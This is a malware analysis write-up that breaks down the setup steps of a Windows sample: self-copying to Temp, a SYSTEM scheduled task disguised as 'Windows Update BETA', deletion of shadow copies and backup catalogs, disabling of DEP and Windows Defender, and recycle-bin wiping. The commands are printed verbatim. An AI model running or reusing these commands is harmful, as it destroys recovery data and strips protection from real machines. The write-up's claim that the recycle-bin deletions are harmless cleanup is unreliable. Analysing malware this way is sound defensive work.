## Setup

### Replication

The malware will create a directory in the temporary folder and copy itself into it.

"C:\\Users\\Admin\\AppData\\Local\\Temp\\3582-490\\Windows Servers Runtime.exe"

### Create Task

![create-task](/images/neshta/neshta-create-task.png)

The command you've provided is used to create a scheduled task in Windows. Here's a breakdown of its components:

```
cmd "/c SCHTASKS.exe /Create /RU \"NT AUTHORITY\\SYSTEM\" /sc onstart /TN \"Windows Update BETA\" /TR \"C:\\Users\\Admin\\AppData\\Local\\Temp\\3582-490\\Windows Servers Runtime.exe\" /F"
```

-   `cmd "/c`: This initiates the execution of the command that follows it. `/c` tells the command prompt to execute the command and then terminate.
    
-   `SCHTASKS.exe /Create`: This command is used to create a scheduled task. `SCHTASKS` is the command-line utility for managing Windows scheduled tasks.
    
-   `/RU "NT AUTHORITY\\SYSTEM"`: This specifies the user account under which the scheduled task will run. In this case, it's set to run under the `SYSTEM` account, which has high-level privileges on the local system.
    
-   `/sc onstart`: This sets the schedule type for the task. `onstart` means the task will run each time the computer starts.
    
-   `/TN "Windows Update BETA"`: This sets the name of the task to "Windows Update BETA".
    
-   `/TR "C:\\Users\\Admin\\AppData\\Local\\Temp\\3582-490\\Windows Servers Runtime.exe"`: This is the action to be performed by the scheduled task. Here, it's set to execute a file named `Windows Servers Runtime.exe` located in a temporary folder within the Admin user's AppData directory.
    
-   `/F`: This forces the task to be created and overwrites any existing task with the same name.
    

**Implications:**

-   The use of the `SYSTEM` account suggests that the task will have extensive privileges on the computer.
-   The executable is located in a temporary folder and not in a typical program directory, which could be suspicious.
-   Naming the task "Windows Update BETA" might be an attempt to disguise its true purpose.

Given these factors, especially the location of the executable and the high privileges, this command could potentially be used for malicious purposes, such as running malware at system startup. It's important to be cautious with such commands, and they should only be used if you trust the source of the executable and understand the command's purpose.

### Disable some moyens de protections

1.  **vssadmin, wbadmin, bcdedit, and wmic command**: `cmd.exe "/c vssadmin.exe delete shadows /all /quiet&&wbadmin delete catalog -quiet && bcdedit.exe /set {current} nx AlwaysOff && wmic SHADOWCOPY DELETE"`
    
    -   `vssadmin.exe delete shadows /all /quiet`: Deletes all system restore points (Shadow Copies) without displaying messages.
    -   `wbadmin delete catalog -quiet`: Deletes the backup catalog, which can prevent previous backups from being restored.
    -   `bcdedit.exe /set {current} nx AlwaysOff`: Disables Data Execution Prevention (DEP) for the current system, potentially making the system more vulnerable to attacks.
    -   `wmic SHADOWCOPY DELETE`: Also deletes shadow copies, another form of restore points.
2.  **Add-MpPreference command (PowerShell)**: `cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"%s\" "`
    
    -   Adds an exclusion in Windows Defender for a specific path (replaced by `%s`), meaning files in this path will not be scanned by Windows Defender.
3.  **Remove-WindowsFeature, New-ItemProperty commands (PowerShell)**: `cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Remove-WindowsFeature Windows-Defender&&powershell -inputformat none -outputformat none -NonInteractive -Command Windows-Defender-GUI&&powershell -inputformat none -outputformat none -NonInteractive -Command New-ItemProperty -Path \"HKLM:SOFTWAREPoliciesMicrosoftWindows Defender\" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force "`
    
    -   Disables and removes Windows Defender (Windows' built-in antivirus) along with its graphical interface.
    -   Modifies the registry to disable Windows Defender's antispyware feature.
4.  **Get-Service, Stop-Service, Set-Service, Set-MpPreference commands (PowerShell)**: `cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Get-Service WinDefend | Stop-Service -PassThru | Set-Service -StartupType Disabled&&powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -DisableRealtimeMonitoring $true "`
    
    -   Stops the Windows Defender service (WinDefend), disables it at startup, and turns off Windows Defender's real-time monitoring.

### Clean Recycle Bin

![create-diectory](/images/neshta/neshta-clean-recycle-bin.png)

```
cmd.exe "/c rd /s /q P:\\$RECYCLE.BIN,Q:\\$RECYCLE.BIN,R:\\$RECYCLE.BIN,S:\\$RECYCLE.BIN,T:\\$RECYCLE.BIN,U:\\$RECYCLE.BIN,V:\\$RECYCLE.BIN,W:\\$RECYCLE.BIN,X:\\$RECYCLE.BIN,F:\\$RECYCLE.BIN,G:\\$RECYCLE.BIN,K:\\$RECYCLE.BIN,L:\\$RECYCLE.BIN,M:\\$RECYCLE.BIN,N:\\$RECYCLE.BIN,O:\\$RECYCLE.BIN,Y:\\$RECYCLE.BIN,Z:\\$RECYCLE.BIN,A:\\$RECYCLE.BIN,B:\\$RECYCLE.BIN,C:\\$RECYCLE.BIN,D:\\$RECYCLE.BIN,E:\\$RECYCLE.BIN,H:\\$RECYCLE.BIN,I:\\$RECYCLE.BIN,J:\\$RECYCLE.BIN"

cmd.exe "/c rd /s /q P:\\Recycler,Q:\\Recycler,R:\\Recycler,S:\\Recycler,T:\\Recycler,U:\\Recycler,V:\\Recycler,W:\\Recycler,X:\\Recycler,F:\\Recycler,G:\\Recycler,K:\\Recycler,L:\\Recycler,M:\\Recycler,N:\\Recycler,O:\\Recycler,Y:\\Recycler,Z:\\Recycler,A:\\Recycler,B:\\Recycler,C:\\Recycler,D:\\Recycler,E:\\Recycler,H:\\Recycler,I:\\Recycler,J:\\Recycler"

cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Remove -Item 'd:\\$RECYCLE.BIN','c:\\$RECYCLE.BIN' -Recurse -Force"

cmd.exe "/c SCHTASKS.exe /Delete /TN \"Windows Update BETA\" /F"
```


These commands are Windows Command Prompt and PowerShell commands used to manipulate the Recycle Bin on various drives and to manage scheduled tasks. Here's a breakdown of each command:

1.  **Deleting $RECYCLE.BIN folders on multiple drives**: `cmd.exe "/c rd /s /q P:\\$RECYCLE.BIN,Q:\\$RECYCLE.BIN,R:\\$RECYCLE.BIN,...J:\\$RECYCLE.BIN"`
    
    -   `rd /s /q`: This command recursively (`/s`) and quietly (`/q`) deletes a directory.
    -   `P:\\$RECYCLE.BIN, Q:\\$RECYCLE.BIN, ..., J:\\$RECYCLE.BIN`: These are the paths to the `$RECYCLE.BIN` folders on various drives from P: to J:.
    -   This command effectively deletes the Recycle Bin folder from each specified drive, which could be used to permanently remove files bypassing the Recycle Bin.
2.  **Deleting Recycler folders on multiple drives**: `cmd.exe "/c rd /s /q P:\\Recycler,Q:\\Recycler,R:\\Recycler,...J:\\Recycler"`
    
    -   Similar to the first command, this one deletes the `Recycler` folder on various drives.
    -   `Recycler` is an older version of the Recycle Bin used in older versions of Windows, like Windows XP.
3.  **Deleting $RECYCLE.BIN folders using PowerShell**: `cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Remove-Item 'd:\\$RECYCLE.BIN','c:\\$RECYCLE.BIN' -Recurse -Force"`
    
    -   This PowerShell command removes the `$RECYCLE.BIN` folders from the C: and D: drives.
    -   `-Recurse -Force`: These flags ensure that all contents within the folders are removed forcefully, including hidden or system files.
4.  **Deleting the scheduled task named "Windows Update BETA"**: `cmd.exe "/c SCHTASKS.exe /Delete /TN \"Windows Update BETA\" /F"`
    
    -   `SCHTASKS.exe /Delete`: This command is used to delete a scheduled task.
    -   `/TN "Windows Update BETA"`: Specifies the name of the task to be deleted.
    -   `/F`: Forces the deletion of the task without any prompts for confirmation.

**Implications:**

-   The commands for deleting the `$RECYCLE.BIN` and `Recycler` folders are often used in system cleanup or when trying to recover from a virus/malware infection that might have affected these directories.
-   Deleting the Recycle Bin folders does not harm the system, as Windows will recreate these folders when needed.
-   The deletion of the scheduled task "Windows Update BETA" is a management action, possibly undoing a previous setup or clearing an unwanted or suspicious task.

It's important to use these commands with caution, as they can lead to permanent deletion of files in the Recycle Bin. Additionally, modifying scheduled tasks should be done with an understanding of why the task was created in the first place.
